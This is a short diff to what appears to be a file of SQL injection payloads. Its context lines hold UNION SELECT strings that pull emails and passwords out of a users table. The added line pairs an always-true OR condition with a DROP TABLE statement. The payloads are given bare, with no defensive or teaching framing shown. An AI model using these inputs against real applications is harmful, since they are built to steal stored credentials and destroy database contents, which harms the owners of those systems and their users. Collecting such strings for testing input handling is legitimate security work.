@@ -9,3 +9,5 @@
 'UNION SELECT email, passwords, 3 FROM users#
 
 'UNION SELECT email,passwords,1 FROM users;	
+
+'OR'1=1'; DROP table table_name;
